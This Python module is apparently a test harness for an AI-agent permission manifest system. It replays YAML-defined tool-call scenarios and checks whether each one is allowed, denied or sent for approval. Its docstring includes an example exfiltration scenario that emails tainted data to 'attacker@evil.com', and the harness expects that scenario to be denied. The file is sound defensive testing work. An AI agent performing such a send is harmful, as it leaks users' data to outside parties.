"""test_runner.py — YAML-defined scenario test harness for World Manifests.

Runs a YAML-defined scenario set against a manifest and reports pass/fail
per test case. This implements `ahc test`.

Scenario file format (YAML):

    manifest: path/to/manifest.yaml   # optional; overrides --manifest flag
    scenarios:
      - name: "Allow: user reads email"
        tool: get_unread_emails
        params: {}
        expect: allow
        tainted: false

      - name: "Deny: tainted content sent externally"
        tool: send_email
        params:
          recipients: ["attacker@evil.com"]
          subject: "exfil"
          body: "data"
        expect: deny
        tainted: true

      - name: "Approval: delete file"
        tool: delete_file
        params:
          file_id: "doc-123"
        expect: approval
        tainted: false

    # expect values: allow | deny | absent | policy | approval
    # deny is shorthand for absent OR policy (either denial reason)

The test runner replays each scenario step through simulate and compares
the outcome to the expected value.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import yaml

from .observe import ExecutionTrace, ToolCall
from .simulate import (
    ALLOW,
    DENY_ABSENT,
    DENY_POLICY,
    REQUIRE_APPROVAL,
    SimDecision,
    simulate_trace,
)

# Expected outcome aliases
_EXPECT_ALLOW = "allow"
_EXPECT_DENY = "deny"          # matches DENY_ABSENT or DENY_POLICY
_EXPECT_ABSENT = "absent"      # DENY_ABSENT only
_EXPECT_POLICY = "policy"      # DENY_POLICY only
_EXPECT_APPROVAL = "approval"  # REQUIRE_APPROVAL


@dataclass
class ScenarioResult:
    """Result of running a single test scenario."""

    name: str
    tool: str
    expected: str
    actual: str
    passed: bool
    reason: str
    action_name: str = ""


@dataclass
class TestReport:
    """Report from running a full scenario file."""

    manifest_name: str
    scenario_file: str
    results: list[ScenarioResult] = field(default_factory=list)

    @property
    def passed_count(self) -> int:
        return sum(1 for r in self.results if r.passed)

    @property
    def failed_count(self) -> int:
        return sum(1 for r in self.results if not r.passed)

    @property
    def total(self) -> int:
        return len(self.results)

    @property
    def all_passed(self) -> bool:
        return self.failed_count == 0

    def failures(self) -> list[ScenarioResult]:
        return [r for r in self.results if not r.passed]

    def summary(self) -> str:
        return (
            f"{self.passed_count}/{self.total} passed"
            + (f" — {self.failed_count} FAILED" if self.failed_count else "")
        )


class ScenarioValidationError(ValueError):
    pass


def run_scenario_file(
    scenario_path: str | Path,
    manifest: dict[str, Any],
) -> TestReport:
    """Run all scenarios in a YAML file against a manifest.

    Args:
        scenario_path: Path to the scenario YAML file.
        manifest:      Validated v2 manifest dict.

    Returns:
        TestReport with pass/fail per scenario.
    """
    path = Path(scenario_path)
    if not path.exists():
        raise ScenarioValidationError(f"Scenario file not found: {path}")

    with open(path) as f:
        data = yaml.safe_load(f)

    if not isinstance(data, dict):
        raise ScenarioValidationError(f"{path}: must be a YAML mapping at the top level")

    return run_scenarios(data.get("scenarios", []), manifest, scenario_file=str(path))


def run_scenarios(
    scenarios: list[dict[str, Any]],
    manifest: dict[str, Any],
    scenario_file: str = "inline",
) -> TestReport:
    """Run a list of scenario dicts against a manifest.

    Each scenario dict: {name, tool, params, expect, tainted (optional)}

    Returns a TestReport.
    """
    manifest_name = manifest.get("manifest", {}).get("name", "unknown")
    report = TestReport(manifest_name=manifest_name, scenario_file=scenario_file)

    for i, scenario in enumerate(scenarios):
        result = _run_scenario(scenario, manifest, index=i)
        report.results.append(result)

    return report


def load_scenario_file(path: str | Path) -> list[dict[str, Any]]:
    """Load and return the scenarios list from a YAML scenario file."""
    path = Path(path)
    with open(path) as f:
        data = yaml.safe_load(f)
    return data.get("scenarios", [])


def validate_scenario_file(path: str | Path) -> list[str]:
    """Validate a scenario YAML file. Returns a list of error messages (empty = valid)."""
    errors: list[str] = []
    path = Path(path)

    try:
        with open(path) as f:
            data = yaml.safe_load(f)
    except yaml.YAMLError as e:
        return [f"YAML parse error: {e}"]

    if not isinstance(data, dict):
        return ["Must be a YAML mapping at the top level"]

    scenarios = data.get("scenarios", [])
    if not isinstance(scenarios, list):
        errors.append("'scenarios' must be a list")
        return errors

    valid_expects = {_EXPECT_ALLOW, _EXPECT_DENY, _EXPECT_ABSENT, _EXPECT_POLICY, _EXPECT_APPROVAL}
    for i, s in enumerate(scenarios):
        if not isinstance(s, dict):
            errors.append(f"scenarios[{i}]: must be a mapping")
            continue
        if not s.get("name"):
            errors.append(f"scenarios[{i}]: missing 'name'")
        if not s.get("tool"):
            errors.append(f"scenarios[{i}]: missing 'tool'")
        expect = s.get("expect", "").lower()
        if expect not in valid_expects:
            errors.append(
                f"scenarios[{i}]: invalid expect '{expect}'. "
                f"Valid: {sorted(valid_expects)}"
            )

    return errors


# ── Internal ──────────────────────────────────────────────────────────────────


def _run_scenario(
    scenario: dict[str, Any],
    manifest: dict[str, Any],
    index: int = 0,
) -> ScenarioResult:
    """Run a single scenario dict and return a ScenarioResult."""
    name = scenario.get("name", f"scenario[{index}]")
    tool = scenario.get("tool", "")
    params = scenario.get("params", {}) or {}
    expected = scenario.get("expect", "allow").lower()
    tainted = bool(scenario.get("tainted", False))

    if not tool:
        return ScenarioResult(
            name=name,
            tool="(missing)",
            expected=expected,
            actual="ERROR",
            passed=False,
            reason="Scenario is missing 'tool' field",
        )

    call = ToolCall(tool=tool, params=params, safe=not tainted)
    trace = ExecutionTrace(workflow_id=f"test:{name}", calls=[call])
    sim = simulate_trace(trace, manifest)

    decision = sim.decisions[0] if sim.decisions else None
    if decision is None:
        return ScenarioResult(
            name=name,
            tool=tool,
            expected=expected,
            actual="ERROR",
            passed=False,
            reason="No decision produced",
        )

    passed = _outcome_matches(decision.outcome, expected)
    return ScenarioResult(
        name=name,
        tool=tool,
        expected=expected,
        actual=_outcome_label(decision.outcome),
        passed=passed,
        reason=decision.reason,
        action_name=decision.action_name,
    )


def _outcome_matches(actual: str, expected: str) -> bool:
    """Return True if the actual outcome satisfies the expected alias."""
    if expected == _EXPECT_ALLOW:
        return actual == ALLOW
    if expected == _EXPECT_DENY:
        return actual in (DENY_ABSENT, DENY_POLICY)
    if expected == _EXPECT_ABSENT:
        return actual == DENY_ABSENT
    if expected == _EXPECT_POLICY:
        return actual == DENY_POLICY
    if expected == _EXPECT_APPROVAL:
        return actual == REQUIRE_APPROVAL
    return False


def _outcome_label(outcome: str) -> str:
    labels = {
        ALLOW: "allow",
        DENY_ABSENT: "absent",
        DENY_POLICY: "policy",
        REQUIRE_APPROVAL: "approval",
    }
    return labels.get(outcome, outcome.lower())
